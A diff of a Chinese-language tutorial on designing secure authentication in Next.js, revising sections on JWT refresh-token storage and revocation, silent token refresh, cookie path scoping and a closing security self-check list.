-      const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
-      return payload
-    } catch {
-      return null
-    }
-  }
-}
-
-export const authService = new AuthService()
-```
-
-#### 8.3.3 刷新接口
-
-```typescript
-// app/api/auth/refresh/route.ts
-import { NextResponse } from 'next/server'
-import { authService } from '@/lib/auth-service'
-
-export async function POST() {
-  const result = await authService.refreshAccessToken()
-
-  if (!result.success) {
-    return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
-  }
-
-  return NextResponse.json({
-    code: 0,
-    message: '令牌刷新成功',
+  // 只存元数据
+  await prisma.refreshTokenMetadata.create({
+    data: { jti, userId, expiresAt },
   })
+
+  return await new SignJWT({ userId, jti, type: 'refresh' })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setIssuedAt()
+    .setExpirationTime('7d')
+    .setJti(jti)
+    .sign(refreshTokenPrivateKey)
 }
 ```
 
-#### 8.3.4 前端自动刷新逻辑
+#### 验证 Refresh Token
 
 ```typescript
-// lib/api-client.ts
+async function verifyRefreshToken(token: string) {
+  try {
+    // 1. 验证 JWT 签名和过期时间
+    const { payload } = await jwtVerify(token, refreshTokenPublicKey)
 
+    // 2. 查数据库——这个 jti 有没有被撤销
+    const metadata = await prisma.refreshTokenMetadata.findUnique({
+      where: { jti: payload.jti as string },
+    })
+
+    if (!metadata || metadata.revoked) return { valid: false }
+    if (metadata.expiresAt < new Date()) return { valid: false }
+
+    return { valid: true, userId: payload.userId as string }
+  } catch {
+    return { valid: false }
+  }
+}
+```
+
+#### 刷新 Access Token
+
+```typescript
+async function refreshAccessToken() {
+  const cookieStore = await cookies()
+  const refreshToken = cookieStore.get('refresh_token')?.value
+
+  if (!refreshToken) return { success: false }
+
+  const { valid, userId } = await verifyRefreshToken(refreshToken)
+  if (!valid || !userId) return { success: false }
+
+  const user = await prisma.user.findUnique({ where: { id: userId } })
+  if (!user) return { success: false }
+
+  const newAccessToken = await generateAccessToken(user.id, user.name)
+
+  cookieStore.set('access_token', newAccessToken, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 15 * 60,
+    path: '/',
+  })
+
+  return { success: true }
+}
+```
+
+#### 前端自动刷新
+
+用户不用知道 Access Token 过期了。你在 API 客户端里做静默刷新：
+
+```typescript
 class ApiClient {
   private isRefreshing = false
-  private refreshSubscribers: Array<(token: string) => void> = []
 
-  /**
-   * 订阅刷新成功的回调
-   */
-  subscribeTokenRefresh(callback: (token: string) => void) {
-    this.refreshSubscribers.push(callback)
-  }
+  async request(url: string, options: RequestInit = {}) {
+    const headers = { 'Content-Type': 'application/json', ...options.headers }
 
-  /**
-   * 通知所有订阅者
-   */
-  notifyTokenRefresh(newToken: string) {
-    this.refreshSubscribers.forEach((callback) => callback(newToken))
-    this.refreshSubscribers = []
-  }
+    let response = await fetch(url, { ...options, headers })
 
-  /**
-   * 刷新Token
-   */
-  private async refreshToken(): Promise<boolean> {
-    if (this.isRefreshing) {
-      // 已经在刷新中，等待刷新完成
-      return new Promise((resolve) => {
-        this.subscribeTokenRefresh(() => resolve(true))
-      })
-    }
-
-    this.isRefreshing = true
-
-    try {
-      const response = await fetch('/api/auth/refresh', {
-        method: 'POST',
-      })
-
-      if (response.ok) {
-        this.isRefreshing = false
-        this.notifyTokenRefresh('refreshed')
-        return true
-      }
-
-      // 刷新失败，跳转登录
-      window.location.href = '/login'
-      return false
-    } catch {
-      this.isRefreshing = false
-      window.location.href = '/login'
-      return false
-    }
-  }
-
-  /**
-   * 发起API请求（带自动刷新）
-   */
-  async request<T>(url: string, options: RequestInit = {}): Promise<T> {
-    // 获取当前Token
-    const accessToken = await this.getAccessToken()
-
-    // 设置请求头
-    const headers = {
-      'Content-Type': 'application/json',
-      ...(accessToken && { Authorization: `Bearer ${accessToken}` }),
-      ...options.headers,
-    }
-
-    let response = await fetch(url, {
-      ...options,
-      headers,
-    })
-
-    // 如果返回401，尝试刷新
+    // 如果返回 401，自动尝试刷新
     if (response.status === 401) {
-      const refreshSuccess = await this.refreshToken()
-
-      if (refreshSuccess) {
-        // 重新获取新Token并重试
-        const newToken = await this.getAccessToken()
-        response = await fetch(url, {
-          ...options,
-          headers: {
-            ...headers,
-            Authorization: `Bearer ${newToken}`,
-          },
-        })
+      const refreshOk = await this.silentRefresh()
+      if (refreshOk) {
+        // 刷新成功，用新 Token 重试原请求
+        response = await fetch(url, { ...options, headers })
+      } else {
+        // 刷新失败——跳转登录页
+        window.location.href = '/login'
+        throw new Error('认证过期')
       }
     }
 
-    if (!response.ok) {
-      throw new Error(`请求失败: ${response.status}`)
-    }
-
+    if (!response.ok) throw new Error(`请求失败: ${response.status}`)
     return response.json()
   }
 
-  /**
-   * 获取Access Token
-   */
-  private async getAccessToken(): Promise<string | null> {
-    const { cookies } = await import('next/headers')
-    const cookieStore = await cookies()
-    return cookieStore.get('access_token')?.value || null
+  private async silentRefresh(): Promise<boolean> {
+    if (this.isRefreshing) {
+      // 已经有请求在刷新了，等它完成
+      return new Promise((resolve) => setTimeout(() => resolve(this.silentRefresh()), 100))
+    }
+
+    this.isRefreshing = true
+    try {
+      const res = await fetch('/api/auth/refresh', { method: 'POST' })
+      return res.ok
+    } finally {
+      this.isRefreshing = false
+    }
   }
 }
-
-export const apiClient = new ApiClient()
 ```
 
-### 8.4 刷新令牌的安全优势总结
+关键细节：`isRefreshing` 锁防止多个 401 触发并发刷新——10 个 API 同时返回 401，只有一个会真正发刷新请求，其余的等待。
 
-| 优势           | 说明                                       |
-| -------------- | ------------------------------------------ |
-| 缩短攻击窗口   | Access Token只有15分钟，黑客能用的时间很短 |
-| 可控的会话管理 | 可以随时撤销Refresh Token，强制重新认证    |
-| 减少密码输入   | 用户不需要频繁输入密码，体验更好           |
-| 多设备管理     | 每个设备独立的Refresh Token，单独管理      |
-| 泄露检测       | 发现异常可以立即撤销所有令牌               |
+#### 登出时撤销
+
+```typescript
+async function logout() {
+  const cookieStore = await cookies()
+  const refreshToken = cookieStore.get('refresh_token')?.value
+
+  if (refreshToken) {
+    try {
+      const { payload } = await jwtVerify(refreshToken, refreshTokenPublicKey)
+      // 在数据库中标记为已撤销
+      await prisma.refreshTokenMetadata.update({
+        where: { jti: payload.jti as string },
+        data: { revoked: true },
+      })
+    } catch {
+      // Token 可能已经过期了，不用管
+    }
+  }
+
+  cookieStore.delete('access_token')
+  cookieStore.delete('refresh_token')
+}
+```
+
+#### 不同 Path 的 Cookie
+
+一个容易被忽略的细节：Access Token 和 Refresh Token 的 Cookie path 应该是不同的。
+
+```typescript
+// Access Token: path='/'  —— 每次 API 请求都发送
+cookieStore.set('access_token', accessToken, { path: '/' })
+
+// Refresh Token: path='/api/auth/refresh'  —— 只在刷新接口发送
+cookieStore.set('refresh_token', refreshToken, {
+  path: '/api/auth/refresh',
+  maxAge: 7 * 24 * 60 * 60,
+})
+```
+
+为什么？减少 Refresh Token 的暴露面。正常 API 请求只需要 Access Token，不需要带 Refresh Token。你把 Refresh Token 的 path 限制在刷新接口，那它在 99% 的请求里都不会被发送，泄露风险降到最低。
+
+### 刷新令牌的安全优势总结
+
+| 优势         | 说明                                            |
+| ------------ | ----------------------------------------------- |
+| 缩短攻击窗口 | Access Token 只有 15 分钟，黑客能操作的时间很短 |
+| 用户体验好   | 用户不知不觉中自动续期，不需要频繁输密码        |
+| 可控的撤销   | 随时可以把某个 jti 标记为 revoked               |
+| 多设备管理   | 每个登录设备独立的 Refresh Token，可以单独踢掉  |
+| 快速响应泄露 | 发现异常后，把用户的所有 Refresh Token 全部撤销 |
 
 ---
 
-## 九、总结：认证系统设计的核心原则
+## 九、最后的最后：你怎么判断自己的认证系统够不够安全
 
-### 9.1 密码存储
+我不给你总结。总结是别人替你思考的结果。
 
-- **永远不要**明文存储密码
-- **永远不要**使用MD5
-- **推荐使用**Argon2（最佳选择）或bcrypt
-- 密码要足够复杂（大小写+数字+特殊字符）
-- 用Zod做服务端验证
+我给你一套问题。你对着自己现在的系统，一个一个问：
 
-### 9.2 会话管理
+**1. 密码存了吗？怎么存的？**
 
-- **推荐使用**JWT作为Token
-- 生产环境用**RS256**（非对称算法）
-- Token有效期要合理（Access 15分钟，Refresh 7天）
-- **必须配合**刷新令牌机制
+- 如果你现在就把数据库 dump 给别人看，他能看到用户的真实密码吗？
+- 如果两个用户的密码碰巧一样，数据库里的 hash 值一样吗？
+- 你用的 hash 算法是 Argon2 还是 bcrypt？如果是 MD5，你现在就去改。
 
-### 9.3 Cookie安全
+**2. Token 管了吗？**
 
-- **HttpOnly**：防止XSS读取
-- **SameSite**：防止CSRF攻击
-- **Secure**：生产环境必须HTTPS
+- 你的 Token 过期时间是多久？超过 1 小时？考虑加刷新令牌机制。
+- 你的 Token 用的是什么签名算法？HS256？考虑换成 RS256。
+- 你的 Token 的 Payload 里放了什么？有没有用户手机号、密码、身份证号？立刻删掉。
 
-### 9.4 防御措施
+**3. Cookie 配对了吗？**
 
-- **速率限制**：防止暴力破解
-- **审计日志**：记录所有认证事件
-- **模糊错误信息**：不告诉攻击者用户名是否存在
+- `httpOnly: true` 设了吗？
+- `sameSite: 'lax'` 或 `strict` 设了吗？
+- 生产环境 `secure: true` 设了吗？
+- Refresh Token 的 Cookie path 是不是限制在刷新接口？
 
-### 9.5 架构设计
+**4. 有人盯着吗？**
 
-- 服务端用**面向对象**设计（AuthService类）
-- 前端用**自定义Hook**封装状态
-- Next.js Server Actions**对外暴露函数**
-- 刷新令牌用**混合方案**（元数据存储）
+- 登录失败有没有记录审计日志？
+- 你有没有速率限制？（10 次/分钟/用户名 是最基本的）
+- 你有没有监控异常——比如某个 IP 在短时间内尝试了 50 个不同的用户名？
 
----
+**5. 如果有人偷到了 Token，你能做什么？**
 
-安全不是一蹴而就的，是一个持续的过程。好的架构让你在面对新威胁时，只需要添加新的防护逻辑，而不需要推倒重来。
+- 你能主动撤销吗？（如果有刷新令牌机制，答案是"能"）
+- 你能在多长时间内发现？（取决于你的审计日志粒度）
+- 你能撤销所有设备吗？（一键踢掉所有登录）
+
+这五个问题没有标准答案。不同的应用，答案不同——银行系统和博客系统的安全要求完全不一样。
+
+但如果你发现自己对其中某个问题完全没有想过——那就打开 IDE，开始补。
+
+安全不是一次性工程。它是一个持续的、跟攻击者赛跑的过程。好的架构让你在面对新威胁时，只需要添加新的防护逻辑，而不是推倒重来。你只需要确保：**每一次认证事件都有记录，每一个 Token 都可以被撤销，每一个攻击路径都有人盯着。**
+
+剩下的，就是在凌晨两点安心睡觉。
